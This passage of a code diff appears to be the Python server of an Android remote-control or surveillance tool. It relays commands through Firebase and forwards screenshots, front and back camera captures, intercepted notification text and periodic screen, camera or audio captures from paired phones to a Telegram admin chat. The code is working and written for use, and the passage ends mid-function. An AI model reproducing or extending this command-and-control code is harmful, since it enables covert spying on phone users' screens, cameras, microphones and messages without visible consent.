@@ -1,0 +1,1056 @@
+  4500→# FIREBASE COMMAND RESULT LISTENER
+  4501→# ============================================================================
+  4502→
+  4503→async def firebase_result_listener():
+  4504→    """Background task: Poll Firebase for results from Android app.
+  4505→    ACTIVE mode - forwards results to Telegram admin."""
+  4506→    global _processed_results
+  4507→    log.info("Firebase result listener started (ACTIVE mode)")
+  4508→
+  4509→    # Clean ALL old results AND commands on startup to prevent re-processing spam
+  4510→    try:
+  4511→        log.info("Cleaning ALL stale Firebase results on startup...")
+  4512→        await firebase_set("results", None)
+  4513→        log.info("Firebase results cleaned successfully")
+  4514→    except Exception as exc:
+  4515→        log.error("Firebase results cleanup error: %s", exc)
+  4516→    try:
+  4517→        log.info("Cleaning ALL stale Firebase commands on startup...")
+  4518→        await firebase_set("commands", None)
+  4519→        log.info("Firebase commands cleaned successfully")
+  4520→    except Exception as exc:
+  4521→        log.error("Firebase commands cleanup error: %s", exc)
+  4522→
+  4523→    while polling_active:
+  4524→        try:
+  4525→            results_data = await firebase_get("results")
+  4526→            if not results_data:
+  4527→                await asyncio.sleep(3)
+  4528→                continue
+  4529→            if not isinstance(results_data, dict):
+  4530→                await firebase_set("results", None)
+  4531→                await asyncio.sleep(3)
+  4532→                continue
+  4533→
+  4534→            processed_any = False
+  4535→            for device_id, cmds in results_data.items():
+  4536→                if not isinstance(cmds, dict):
+  4537→                    continue
+  4538→                for cmd_id, result_entry in cmds.items():
+  4539→                    if not isinstance(result_entry, dict):
+  4540→                        continue
+  4541→
+  4542→                    result_text = result_entry.get("result", "")
+  4543→                    command = result_entry.get("command", cmd_id)
+  4544→                    status = result_entry.get("status", "completed")
+  4545→
+  4546→                    # Simple dedup by cmd_id (not content hash - prevents delete failures)
+  4547→                    result_key = f"{device_id}:{cmd_id}"
+  4548→
+  4549→                    if result_key in _processed_results:
+  4550→                        continue
+  4551→
+  4552→                    # === FORWARD RESULT TO TELEGRAM ===
+  4553→                    try:
+  4554→                        d = find_device(device_id)
+  4555→                        dev_name = d.get("name", device_id) if d else device_id
+  4556→
+  4557→                        # Try to parse result as JSON for better formatting and image detection
+  4558→                        result_json_parsed = None
+  4559→                        b64_image = None
+  4560→                        display_text = str(result_text) if result_text else "تم بنجاح"
+  4561→                        if len(display_text) > 4000:
+  4562→                            display_text = display_text[:4000] + "..."
+  4563→
+  4564→                        try:
+  4565→                            result_json_parsed = json.loads(str(result_text))
+  4566→                            if isinstance(result_json_parsed, dict):
+  4567→                                # Check for base64 image in result (screenshots, cameras)
+  4568→                                for img_key in ("base64", "base64_preview", "image", "image_data"):
+  4569→                                    img_val = result_json_parsed.get(img_key, "")
+  4570→                                    if img_val and len(img_val) > 1000:
+  4571→                                        b64_image = img_val
+  4572→                                        break
+  4573→                                if result_json_parsed.get("ok") and result_json_parsed.get("message"):
+  4574→                                    display_text = result_json_parsed["message"]
+  4575→                                elif result_json_parsed.get("ok") and result_json_parsed.get("data") is not None:
+  4576→                                    data = result_json_parsed["data"]
+  4577→                                    if isinstance(data, list):
+  4578→                                        count = len(data)
+  4579→                                        if count == 0:
+  4580→                                            display_text = "لا توجد بيانات"
+  4581→                                        elif count <= 15:
+  4582→                                            display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(data, ensure_ascii=False, indent=2)[:3000]}</code>"
+  4583→                                        else:
+  4584→                                            items_str = json.dumps(data[:10], ensure_ascii=False, indent=2)[:2000]
+  4585→                                            display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{items_str}</code>\n\n...و {count-10} أخرى"
+  4586→                                    elif isinstance(data, dict):
+  4587→                                        display_text = json.dumps(data, ensure_ascii=False, indent=2)[:3000]
+  4588→                        except Exception:
+  4589→                            pass
+  4590→
+  4591→                        cmd_desc = command or cmd_id
+  4592→                        for reg_name, reg_info in COMMAND_REGISTRY.items():
+  4593→                            if reg_info.get("cmd") == command:
+  4594→                                cmd_desc = reg_info.get("desc", command)
+  4595→                                break
+  4596→
+  4597→                        if status in ("completed", "success"):
+  4598→                            emoji = "\u2705"
+  4599→                        elif status == "error":
+  4600→                            emoji = "\u274c"
+  4601→                        else:
+  4602→                            emoji = "\U0001f4cb"
+  4603→
+  4604→                        # Try to EDIT the pending message first (or send new)
+  4605→                        pending = _pending_messages.pop(cmd_id, None)
+  4606→                        batch_id = pending.get("batch_id") if pending else None
+  4607→
+  4608→                        # === Send image directly for screenshots/camera ===
+  4609→                        img_sent = False
+  4610→                        if b64_image and command in ("screenshot", "front_camera", "back_camera"):
+  4611→                            try:
+  4612→                                import base64 as _b64
+  4613→                                img_bytes = _b64.b64decode(b64_image)
+  4614→                                if len(img_bytes) > 5000:  # Only send if meaningful size
+  4615→                                    caption = f"{emoji} {dev_name} - {cmd_desc}"
+  4616→                                    photo_resp = await send_photo(ADMIN_CHAT_ID, img_bytes, caption=caption)
+  4617→                                    if photo_resp and photo_resp.get("ok"):
+  4618→                                        img_sent = True
+  4619→                                        log.info("Sent result as PHOTO: cmd=%s device=%s size=%d", cmd_id, device_id, len(img_bytes))
+  4620→                            except Exception as img_err:
+  4621→                                log.warning("Failed to send result as photo for cmd=%s: %s", cmd_id, img_err)
+  4622→
+  4623→                        # Build text message
+  4624→                        msg = (
+  4625→                            f"{emoji} <b>نتيجة الأمر</b>\n\n"
+  4626→                            f"\U0001f4f1 الجهاز: <code>{dev_name}</code>\n"
+  4627→                            f"\U0001f4cb الأمر: {cmd_desc}\n"
+  4628→                            f"\U0001f194 المعرف: <code>{cmd_id}</code>\n\n"
+  4629→                            f"<code>{display_text}</code>"
+  4630→                        )
+  4631→
+  4632→                        # If image was sent, keep text shorter
+  4633→                        if img_sent:
+  4634→                            msg = f"{emoji} <b>{cmd_desc}</b>\n\U0001f4f1 <code>{dev_name}</code>\n\n<code>{display_text[:2000]}</code>"
+  4635→
+  4636→                        msg_sent = False
+  4637→                        if pending and pending.get("message_id"):
+  4638→                            try:
+  4639→                                edit_resp = await edit_message_text(
+  4640→                                    pending["chat_id"], pending["message_id"],
+  4641→                                    msg, reply_markup=None
+  4642→                                )
+  4643→                                if edit_resp and edit_resp.get("ok"):
+  4644→                                    msg_sent = True
+  4645→                                    log.info("Result EDITED pending message: cmd=%s msg_id=%d", cmd_id, pending["message_id"])
+  4646→                                else:
+  4647→                                    log.warning("Edit pending message failed for cmd=%s, sending new", cmd_id)
+  4648→                            except Exception as edit_err:
+  4649→                                log.warning("Edit pending message error for cmd=%s: %s", cmd_id, edit_err)
+  4650→                        
+  4651→                        if not msg_sent:
+  4652→                            # For batch ops, don't flood - just update counter
+  4653→                            if batch_id and batch_id in _batch_operations:
+  4654→                                _batch_operations[batch_id]["responded"] += 1
+  4655→                                await update_batch_progress(batch_id)
+  4656→                            else:
+  4657→                                await send_admin(msg)
+  4658→                        elif batch_id and batch_id in _batch_operations:
+  4659→                            _batch_operations[batch_id]["responded"] += 1
+  4660→                            await update_batch_progress(batch_id)
+  4661→                        log.info("Result FORWARDED to Telegram: cmd=%s device=%s type=%s", cmd_id, device_id, command)
+  4662→                    except Exception as send_err:
+  4663→                        log.error("Failed to forward result to Telegram: %s", send_err)
+  4664→
+  4665→                    # Update local command status
+  4666→                    await update_command_status(cmd_id, status, result_text)
+  4667→                    await update_device(device_id, {"active": True})
+  4668→
+  4669→                    # === CACHE SCREENSHOT/CAMERA IMAGES FOR STREAMING ===
+  4670→                    if command in ("screenshot", "front_camera", "back_camera") and status in ("completed", "success"):
+  4671→                        try:
+  4672→                            result_json = json.loads(str(result_text)) if isinstance(result_text, str) else result_text
+  4673→                            if isinstance(result_json, dict):
+  4674→                                b64_data = result_json.get("base64_preview", "")
+  4675→                                # Cache if we have substantial base64 data (full image, not truncated)
+  4676→                                if len(b64_data) > 1000 and "..." not in b64_data[-5:]:
+  4677→                                    frame_key = f"{device_id}:video"
+  4678→                                    _latest_frames_module[frame_key] = {
+  4679→                                        "data": b64_data,
+  4680→                                        "timestamp": time.time(),
+  4681→                                        "size": result_json.get("size", len(b64_data)),
+  4682→                                        "source": command,
+  4683→                                        "stream_id": device_id,
+  4684→                                        "is_keyframe": True,
+  4685→                                        "codec": "jpeg",
+  4686→                                    }
+  4687→                                    if device_id in _jpeg_stream_info:
+  4688→                                        _jpeg_stream_info[device_id]["last_frame_time"] = time.time()
+  4689→                                        _jpeg_stream_info[device_id]["frame_count"] = _jpeg_stream_info[device_id].get("frame_count", 0) + 1
+  4690→                                    log.info("Cached %s result image for streaming: device=%s b64_len=%d", command, device_id, len(b64_data))
+  4691→                        except Exception as cache_err:
+  4692→                            log.error("Failed to cache screenshot result: %s", cache_err)
+  4693→
+  4694→                    # Delete the result from Firebase immediately
+  4695→                    try:
+  4696→                        validate_id(device_id, "device_id")
+  4697→                        validate_id(cmd_id, "cmd_id")
+  4698→                        await firebase_set(f"results/{device_id}/{cmd_id}", None)
+  4699→                    except Exception as del_err:
+  4700→                        log.warning("Failed to delete Firebase result %s/%s: %s", device_id, cmd_id, del_err)
+  4701→
+  4702→                    _processed_results.add(result_key)
+  4703→                    processed_any = True
+  4704→
+  4705→            if len(_processed_results) > 500:
+  4706→                _processed_results = set(list(_processed_results)[-200:])
+  4707→            
+  4708→            # Cleanup stale pending messages (older than 5 minutes)
+  4709→            now_ts = time.time()
+  4710→            stale_keys = [k for k, v in _pending_messages.items() if now_ts - v.get("created_at", 0) > 300]
+  4711→            for sk in stale_keys:
+  4712→                del _pending_messages[sk]
+  4713→            if stale_keys:
+  4714→                log.info("Cleaned %d stale pending message(s)", len(stale_keys))
+  4715→
+  4716→        except Exception as exc:
+  4717→            log.error("Firebase listener error: %s", exc)
+  4718→
+  4719→        # === Also clean stale Firebase commands (older than 90s, must exceed the 60s auto-delete) ===
+  4720→        try:
+  4721→            for dev in get_devices():
+  4722→                did = dev.get("id", "")
+  4723→                if not did:
+  4724→                    continue
+  4725→                fb_cmds = await firebase_get(f"commands/{did}")
+  4726→                if fb_cmds and isinstance(fb_cmds, dict):
+  4727→                    now = time.time()
+  4728→                    for cid, cdata in fb_cmds.items():
+  4729→                        if not isinstance(cdata, dict):
+  4730→                            continue
+  4731→                        try:
+  4732→                            validate_id(did, "device_id")
+  4733→                            validate_id(cid, "cmd_id")
+  4734→                        except ValueError:
+  4735→                            continue
+  4736→                        created = cdata.get("created_at", "")
+  4737→                        if created:
+  4738→                            try:
+  4739→                                from datetime import datetime as _dt2
+  4740→                                ts_val = _dt2.strptime(created, "%Y-%m-%d %H:%M:%S").timestamp()
+  4741→                                if now - ts_val > 90:
+  4742→                                    await firebase_set(f"commands/{did}/{cid}", None)
+  4743→                                    log.info("Cleaned stale Firebase command %s/%s (age=%ds)", did, cid, int(now-ts_val))
+  4744→                            except Exception:
+  4745→                                await firebase_set(f"commands/{did}/{cid}", None)
+  4746→                        else:
+  4747→                            # No timestamp - delete if we've already processed it
+  4748→                            await firebase_set(f"commands/{did}/{cid}", None)
+  4749→        except Exception as clean_err:
+  4750→            pass  # Don't let cleanup errors break the listener
+  4751→
+  4752→        await asyncio.sleep(3)
+  4753→
+  4754→# ============================================================================
+  4755→# DEVICE MONITORING LOOP
+  4756→# ============================================================================
+  4757→
+  4758→async def device_monitoring_loop():
+  4759→    """Background task: Monitor device online/offline status by checking last_seen timestamps.
+  4760→    Detects devices that went offline without sending an explicit offline heartbeat."""
+  4761→    global _device_last_online_state
+  4762→    log.info("Device monitoring loop started")
+  4763→
+  4764→    # Initialize tracking state from existing devices on startup
+  4765→    await asyncio.sleep(10)  # Wait for devices to register
+  4766→    for d in get_devices():
+  4767→        did = d.get("id", "")
+  4768→        if did and did not in _device_last_online_state:
+  4769→            _device_last_online_state[did] = d.get("active", False)
+  4770→            log.info("Monitor: initialized %s as %s", did, "online" if d.get("active") else "offline")
+  4771→
+  4772→    while polling_active:
+  4773→        try:
+  4774→            now = time.time()
+  4775→            devices = get_devices()
+  4776→            for d in devices:
+  4777→                did = d.get("id", "")
+  4778→                if not did:
+  4779→                    continue
+  4780→                last_seen_str = d.get("last_seen", "")
+  4781→                is_active = d.get("active", False)
+  4782→
+  4783→                # Parse last_seen to check if device should be considered offline
+  4784→                try:
+  4785→                    last_seen_dt = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
+  4786→                    last_seen_ts = last_seen_dt.timestamp()
+  4787→                    time_since_seen = now - last_seen_ts
+  4788→                except Exception:
+  4789→                    time_since_seen = 999999
+  4790→
+  4791→                # If device is marked active but hasn't been seen recently, mark offline
+  4792→                if is_active and time_since_seen > DEVICE_OFFLINE_TIMEOUT:
+  4793→                    await update_device(did, {"active": False})
+  4794→                    # Trigger offline alert via state tracking
+  4795→                    was_online = _device_last_online_state.get(did, False)
+  4796→                    if was_online:
+  4797→                        _device_last_online_state[did] = False
+  4798→                        dev_name = d.get("name", did)
+  4799→                        try:
+  4800→                            await send_admin(
+  4801→                                f"🔴 <b>الجهاز غير متصل</b>\n\n"
+  4802→                                f"📱 {dev_name} (<code>{did}</code>)\n"
+  4803→                                f"⏱️ آخر ظهور: {last_seen_str}\n"
+  4804→                                f"🕐 {ts()}",
+  4805→                                disable_notification=True
+  4806→                            )
+  4807→                        except Exception:
+  4808→                            pass
+  4809→                        append_event("Device offline (timeout)", {"device_id": did})
+  4810→
+  4811→            # Cleanup stale batch operations (older than 10 minutes)
+  4812→            stale_batches = [k for k, v in _batch_operations.items() if now - v.get("created_at", 0) > 600]
+  4813→            for sb in stale_batches:
+  4814→                del _batch_operations[sb]
+  4815→
+  4816→        except Exception as exc:
+  4817→            log.error("Device monitoring error: %s", exc)
+  4818→
+  4819→        await asyncio.sleep(60)  # Check every 60 seconds
+  4820→
+  4821→
+  4822→# ============================================================================
+  4823→# SESSION CLEANUP TASK
+  4824→# ============================================================================
+  4825→
+  4826→async def session_cleanup_loop():
+  4827→    while True:
+  4828→        try:
+  4829→            sessions = load_json(SESSIONS_FILE, [])
+  4830→            now = datetime.now(timezone.utc)
+  4831→            active = []
+  4832→            for s in sessions:
+  4833→                try:
+  4834→                    expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
+  4835→                    if now <= expires:
+  4836→                        active.append(s)
+  4837→                except Exception:
+  4838→                    continue
+  4839→            save_json(SESSIONS_FILE, active)
+  4840→            
+  4841→            # Keep used codes and recent unused codes (lifetime codes)
+  4842→            codes = load_json(LINK_CODES_FILE, [])
+  4843→            used = [c for c in codes if c.get("used")]
+  4844→            unused = [c for c in codes if not c.get("used")]
+  4845→            # Keep only last 100 unused codes
+  4846→            if len(unused) > 100:
+  4847→                unused = unused[-100:]
+  4848→            save_json(LINK_CODES_FILE, used + unused)
+  4849→        except Exception:
+  4850→            pass
+  4851→        await asyncio.sleep(3600)
+  4852→
+  4853→# ============================================================================
+  4854→# APP FACTORY & ROUTES
+  4855→# ============================================================================
+  4856→
+  4857→def create_app():
+  4858→    app = web.Application(middlewares=[cors_middleware], client_max_size=50*1024*1024)  # 50MB for file uploads
+  4859→    
+  4860→    @web.middleware
+  4861→    async def log_requests(request, handler):
+  4862→        if request.method == "POST":
+  4863→            log.info("POST %s from %s (%s)", request.path, request.remote, request.headers.get("User-Agent", "")[:50])
+  4864→        try:
+  4865→            return await handler(request)
+  4866→        except web.HTTPNotFound:
+  4867→            log.warning("404 NOT FOUND: %s %s", request.method, request.path)
+  4868→            raise
+  4869→        except Exception as e:
+  4870→            log.error("Request error %s %s: %s", request.method, request.path, e)
+  4871→            raise
+  4872→    
+  4873→    # Web Dashboard
+  4874→    app.router.add_get("/", serve_dashboard)
+  4875→    app.router.add_get("/dashboard", serve_dashboard)
+  4876→    
+  4877→    # Health check endpoint (for Android app connectivity test)
+  4878→    async def api_health(request):
+  4879→        return web.json_response({
+  4880→            "ok": True,
+  4881→            "status": "running",
+  4882→            "version": "3.4",
+  4883→            "firebase": firebase_connected,
+  4884→            "uptime": get_uptime(),
+  4885→            "devices": len(get_devices()),
+  4886→            "commands": len(COMMAND_REGISTRY),
+  4887→        })
+  4888→    app.router.add_get("/api/health", api_health)
+  4889→    
+  4890→    # Auth API
+  4891→    app.router.add_post("/api/login", api_web_login)
+  4892→    
+  4893→    # Device API (no auth - device authenticates via link code/token)
+  4894→    app.router.add_post("/api/verify_link", api_verify_link)
+  4895→    app.router.add_post("/api/register", api_register)
+  4896→    app.router.add_get("/api/commands/{device_id}", api_get_commands)
+  4897→    app.router.add_get("/api/commands", api_get_commands)
+  4898→    app.router.add_post("/api/command_result/{command_id}", api_command_result)
+  4899→    app.router.add_post("/api/data/{device_id}", api_device_data)
+  4900→    app.router.add_post("/api/data", api_device_data_body)
+  4901→    app.router.add_post("/api/heartbeat", api_heartbeat)
+  4902→    app.router.add_get("/api/settings/{device_id}", api_device_settings)
+  4903→
+  4904→    # Device event API (receives buffered events from the app)
+  4905→    async def api_device_event(request):
+  4906→        """POST /api/event - Receive device events (notifications, monitoring, etc.)."""
+  4907→        global api_hits
+  4908→        api_hits += 1
+  4909→        try:
+  4910→            body = await request.json()
+  4911→            device_id = body.get("device_id", "")
+  4912→            event_type = body.get("event_type", "")
+  4913→            data = body.get("data", {})
+  4914→            timestamp = body.get("timestamp", time.time() * 1000)
+  4915→
+  4916→            if not device_id or not event_type:
+  4917→                return web.json_response({"ok": False, "error": "device_id and event_type required"}, status=400)
+  4918→
+  4919→            # Validate device token
+  4920→            device_token = request.headers.get("X-Device-Token", "")
+  4921→            if not get_device_by_token(device_id, device_token):
+  4922→                return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+  4923→
+  4924→            # Append to events log
+  4925→            event_entry = {
+  4926→                "device_id": device_id,
+  4927→                "event_type": event_type,
+  4928→                "data": data,
+  4929→                "timestamp": timestamp,
+  4930→                "server_time": ts()
+  4931→            }
+  4932→
+  4933→            events = load_json(EVENTS_FILE, [])
+  4934→            events.append(event_entry)
+  4935→            # Keep last 1000 events
+  4936→            if len(events) > 1000:
+  4937→                events = events[-1000:]
+  4938→            save_json(EVENTS_FILE, events)
+  4939→
+  4940→            # Forward notification events to Telegram
+  4941→            if event_type == "notification" and load_settings().get("notifications", False):
+  4942→                title = data.get("title", "")
+  4943→                text = data.get("text", "")
+  4944→                pkg = data.get("package", "")
+  4945→                if title or text:
+  4946→                    msg = f"🔔 Device Event\n\nDevice: {device_id}\nType: {event_type}\n   package: {pkg}\n   title: {title}\n   text: {text}"
+  4947→                    await send_message(ADMIN_CHAT_ID, msg)
+  4948→
+  4949→            return web.json_response({"ok": True, "stored": True})
+  4950→        except Exception as exc:
+  4951→            log.error("device_event error: %s", exc)
+  4952→            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+  4953→
+  4954→    app.router.add_post("/api/event", api_device_event)
+  4955→    
+  4956→    # File upload API (for media: photos, videos, audio, screenshots)
+  4957→    app.router.add_post("/api/upload", api_upload_file)
+  4958→    app.router.add_post("/api/upload_base64", api_upload_base64)
+  4959→
+  4960→    # Public API - link code generation (no auth required for device linking)
+  4961→    async def api_generate_link(request):
+  4962→        """POST /api/link_code - Generate a new link code for device pairing."""
+  4963→        global api_hits
+  4964→        api_hits += 1
+  4965→        try:
+  4966→            body = await request.json()
+  4967→            # Verify the device is registered
+  4968→            device_id = body.get("device_id", "")
+  4969→            if device_id and not find_device(device_id):
+  4970→                return web.json_response({"ok": False, "error": "Device not registered"}, status=403)
+  4971→            entry = await generate_link_code()
+  4972→            return web.json_response({"ok": True, "code": entry["code"], "session_id": entry.get("session_id", "")})
+  4973→        except Exception as exc:
+  4974→            log.error("link_code generation error: %s", exc)
+  4975→            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+  4976→    app.router.add_post("/api/link_code", api_generate_link)
+  4977→    
+  4978→    # Web API (requires auth)
+  4979→    app.router.add_get("/api/web/devices", api_web_devices)
+  4980→    app.router.add_get("/api/web/device/{device_id}", api_web_device_detail)
+  4981→    app.router.add_get("/api/web/commands", api_web_commands)
+  4982→    app.router.add_get("/api/web/events", api_web_events)
+  4983→    app.router.add_get("/api/web/stats", api_web_stats)
+  4984→    app.router.add_post("/api/web/send_command", api_web_send_command)
+  4985→    app.router.add_get("/api/web/link_code", api_web_link_code)
+  4986→    app.router.add_get("/api/web/settings", api_web_settings_get)
+  4987→    app.router.add_put("/api/web/settings", api_web_settings_set)
+  4988→    app.router.add_delete("/api/web/unlink/{device_id}", api_web_unlink)
+  4989→    app.router.add_post("/api/web/logout", api_web_logout)
+  4990→    
+  4991→    # ========== STREAMING WebSocket & REST API ==========
+  4992→
+  4993→    # In-memory store for active streams and latest frames
+  4994→    # Key: device_id -> {"ws": WebSocket, "streams": {...}, "last_activity": float}
+  4995→    _stream_connections = {}
+  4996→    # Key: f"{device_id}:{stream_type}" -> {"frame": base64_str, "timestamp": float, "config": dict}
+  4997→    _latest_frames = {}
+  4998→    # Key: f"{device_id}:{stream_type}" -> {"audio_chunk": base64_str, "timestamp": float}
+  4999→    _latest_audio = {}
+  5000→    # IP -> device_id mapping - use module-level _ip_device_map
+  5001→    # JPEG tasks use module-level _jpeg_stream_tasks_module
+  5002→
+  5003→    # STREAMS_FILE removed (was unused)
+  5004→
+  5005→    async def ws_stream(request):
+  5006→        """WebSocket endpoint for streaming - /ws/stream?device_id=xxx&stream_id=xxx"""
+  5007→        from aiohttp import WSMsgType
+  5008→        ws = web.WebSocketResponse(max_msg_size=10*1024*1024, heartbeat=30)  # 10MB
+  5009→        await ws.prepare(request)
+  5010→
+  5011→        device_id = request.query.get("device_id", "")
+  5012→        stream_id = request.query.get("stream_id", "")
+  5013→
+  5014→        if not device_id:
+  5015→            await ws.close(4001, "device_id required")
+  5016→            return ws
+  5017→
+  5018→        log.info("WebSocket stream connected: device=%s stream=%s", device_id, stream_id)
+  5019→        _stream_connections[device_id] = {"ws": ws, "stream_id": stream_id, "last_activity": time.time()}
+  5020→
+  5021→        # Update device streaming status
+  5022→        await update_device(device_id, {"streaming": True, "stream_id": stream_id})
+  5023→
+  5024→        try:
+  5025→            async for msg in ws:
+  5026→                if msg.type == WSMsgType.TEXT:
+  5027→                    try:
+  5028→                        data = json.loads(msg.data)
+  5029→                        msg_type = data.get("type", "")
+  5030→
+  5031→                        if msg_type in ("video", "audio"):
+  5032→                            # Store latest frame/audio for dashboard polling
+  5033→                            frame_key = f"{device_id}:{msg_type}"
+  5034→                            entry = {
+  5035→                                "data": data.get("data", ""),
+  5036→                                "timestamp": data.get("timestamp", 0),
+  5037→                                "size": data.get("size", 0),
+  5038→                                "stream_id": data.get("stream_id", ""),
+  5039→                                "is_keyframe": data.get("is_keyframe", False),
+  5040→                                "codec": data.get("codec", ""),
+  5041→                                "source": data.get("source", ""),
+  5042→                            }
+  5043→                            if msg_type == "video":
+  5044→                                _latest_frames[frame_key] = entry
+  5045→                            else:
+  5046→                                _latest_audio[frame_key] = entry
+  5047→
+  5048→                            _stream_connections[device_id]["last_activity"] = time.time()
+  5049→
+  5050→                            # Forward to any dashboard viewer WebSockets
+  5051→                            # Match by device_id OR exact stream_id for maximum compatibility
+  5052→                            for vid, vinfo in list(_stream_connections.items()):
+  5053→                                if vid.startswith("viewer_"):
+  5054→                                    target = vinfo.get("target_stream", "")
+  5055→                                    # Forward if viewer's target matches device_id OR stream_id
+  5056→                                    if target == device_id or target == stream_id:
+  5057→                                        try:
+  5058→                                            await vinfo["ws"].send_str(msg.data)
+  5059→                                        except Exception:
+  5060→                                            pass
+  5061→
+  5062→                        elif msg_type == "error":
+  5063→                            log.warning("Stream error from %s: %s", device_id, data.get("error", ""))
+  5064→
+  5065→                        elif msg_type == "config":
+  5066→                            # Stream config message - just log it
+  5067→                            log.debug("Stream config from %s: %s", device_id, json.dumps(data, ensure_ascii=False)[:200])
+  5068→
+  5069→                    except json.JSONDecodeError:
+  5070→                        pass
+  5071→                    except Exception as exc:
+  5072→                        log.error("Error processing stream message from %s: %s", device_id, exc)
+  5073→
+  5074→                elif msg.type == WSMsgType.ERROR:
+  5075→                    log.warning("WebSocket error from device %s", device_id)
+  5076→                    break
+  5077→                elif msg.type in (WSMsgType.CLOSED, WSMsgType.CLOSING):
+  5078→                    break
+  5079→        finally:
+  5080→            _stream_connections.pop(device_id, None)
+  5081→            await update_device(device_id, {"streaming": False, "stream_id": ""})
+  5082→            log.info("WebSocket stream disconnected: device=%s", device_id)
+  5083→
+  5084→        return ws
+  5085→
+  5086→    async def ws_stream_viewer(request):
+  5087→        """WebSocket endpoint for dashboard viewers - /ws/stream/viewer?stream_id=xxx"""
+  5088→        from aiohttp import WSMsgType
+  5089→        ws = web.WebSocketResponse(heartbeat=30)
+  5090→        await ws.prepare(request)
+  5091→
+  5092→        stream_id = request.query.get("stream_id", "")
+  5093→        if not stream_id:
+  5094→            await ws.close(4001, "stream_id required")
+  5095→            return ws
+  5096→
+  5097→        viewer_id = f"viewer_{stream_id}"
+  5098→        _stream_connections[viewer_id] = {"ws": ws, "target_stream": stream_id, "last_activity": time.time()}
+  5099→
+  5100→        log.info("Stream viewer connected for stream_id=%s", stream_id)
+  5101→
+  5102→        # Send any cached frames
+  5103→        for key, entry in _latest_frames.items():
+  5104→            if stream_id in key:
+  5105→                try:
+  5106→                    await ws.send_str(json.dumps({"type": "cached_frame", **entry}))
+  5107→                except Exception:
+  5108→                    break
+  5109→
+  5110→        try:
+  5111→            async for msg in ws:
+  5112→                if msg.type in (WSMsgType.CLOSED, WSMsgType.CLOSING, WSMsgType.ERROR):
+  5113→                    break
+  5114→                elif msg.type == WSMsgType.TEXT:
+  5115→                    try:
+  5116→                        data = json.loads(msg.data)
+  5117→                        cmd = data.get("type", "")
+  5118→                        if cmd in ("stop_stream", "pause_stream", "resume_stream", "request_keyframe", "config_update"):
+  5119→                            for did, dinfo in _stream_connections.items():
+  5120→                                if not did.startswith("viewer_"):
+  5121→                                    if did == stream_id or dinfo.get("stream_id") == stream_id:
+  5122→                                        try:
+  5123→                                            await dinfo["ws"].send_str(msg.data)
+  5124→                                        except Exception:
+  5125→                                            pass
+  5126→                    except Exception:
+  5127→                        pass
+  5128→        finally:
+  5129→            _stream_connections.pop(viewer_id, None)
+  5130→            log.info("Stream viewer disconnected for stream_id=%s", stream_id)
+  5131→
+  5132→        return ws
+  5133→
+  5134→    @require_auth
+  5135→    async def api_stream_frame(request):
+  5136→        """GET /api/stream/frame/{device_id}?type=video|audio - Get latest stream frame for a device"""
+  5137→        device_id = request.match_info.get("device_id", "")
+  5138→        frame_type = request.query.get("type", "video")
+  5139→
+  5140→        frame_key = f"{device_id}:{frame_type}"
+  5141→        # Check both local (WebSocket streams) and module-level (JPEG uploads) caches
+  5142→        store = _latest_frames if frame_type == "video" else _latest_audio
+  5143→        entry = store.get(frame_key)
+  5144→        if not entry:
+  5145→            entry = _latest_frames_module.get(frame_key)
+  5146→
+  5147→        if not entry:
+  5148→            return web.json_response({"ok": False, "error": "No active stream"})
+  5149→
+  5150→        return web.json_response({"ok": True, **entry})
+  5151→
+  5152→    @require_auth
+  5153→    async def api_stream_status(request):
+  5154→        """GET /api/stream/status - Get all active stream connections"""
+  5155→        active = {}
+  5156→        for did, dinfo in _stream_connections.items():
+  5157→            if not did.startswith("viewer_"):
+  5158→                active[did] = {
+  5159→                    "stream_id": dinfo.get("stream_id", ""),
+  5160→                    "last_activity": dinfo.get("last_activity", 0),
+  5161→                    "has_video_frame": f"{did}:video" in _latest_frames or f"{did}:video" in _latest_frames_module,
+  5162→                    "has_audio_chunk": f"{did}:audio" in _latest_audio,
+  5163→                }
+  5164→        # Also report JPEG screenshot streams
+  5165→        for did, info in _jpeg_stream_info.items():
+  5166→            if info.get("active"):
+  5167→                active[did] = {
+  5168→                    "stream_id": did,
+  5169→                    "last_activity": info.get("last_frame_time", 0),
+  5170→                    "has_video_frame": f"{did}:video" in _latest_frames_module,
+  5171→                    "has_audio_chunk": False,
+  5172→                    "jpeg_stream": True,
+  5173→                }
+  5174→        return web.json_response({"ok": True, "active_streams": active, "total": len(active)})
+  5175→
+  5176→    async def _jpeg_stream_loop(device_id, stream_type, interval):
+  5177→        """Background task that queues screenshot/camera commands at regular intervals."""
+  5178→        import asyncio
+  5179→        cmd_map = {
+  5180→            "screen": "screenshot",
+  5181→            "camera": "front_camera",
+  5182→            "audio": "record_audio",
+  5183→        }
+  5184→        cmd = cmd_map.get(stream_type, "screenshot")
+  5185→        log.info("JPEG stream loop started: device=%s type=%s cmd=%s interval=%ds", device_id, stream_type, cmd, interval)
+  5186→        try:
+  5187→            while device_id in _jpeg_stream_info and _jpeg_stream_info[device_id].get("active"):
+  5188→                # Queue the capture command
+  5189→                await queue_command(device_id, cmd)
+  5190→                _jpeg_stream_info[device_id]["last_command_time"] = time.time()
+  5191→                log.debug("JPEG stream: queued '%s' for %s", cmd, device_id)
+  5192→                # Wait for interval (check every second so we can stop promptly)
+  5193→                for _ in range(interval):
+  5194→                    if device_id not in _jpeg_stream_info or not _jpeg_stream_info[device_id].get("active"):
+  5195→                        break
+  5196→                    await asyncio.sleep(1)
+  5197→        except asyncio.CancelledError:
+  5198→            pass
+  5199→        except Exception as e:
+  5200→            log.error("JPEG stream loop error for %s: %s", device_id, e)
+  5201→        finally:
+  5202→            log.info("JPEG stream loop ended: device=%s", device_id)
+  5203→
+  5204→    @require_auth
+  5205→    async def api_jpeg_stream_start(request):
+  5206→        """POST /api/stream/jpeg_start - Start JPEG screenshot streaming for a device."""
+  5207→        global api_hits
+  5208→        api_hits += 1
+  5209→        try:
+  5210→            body = await request.json()
+  5211→            device_id = body.get("device_id", "")
+  5212→            stream_type = body.get("type", "screen")
+  5213→            interval = body.get("interval", 3)
+  5214→
+  5215→            if not device_id:
+  5216→                return web.json_response({"ok": False, "error": "device_id required"}, status=400)
+  5217→
+  5218→            d = find_device(device_id)
+  5219→            if not d:
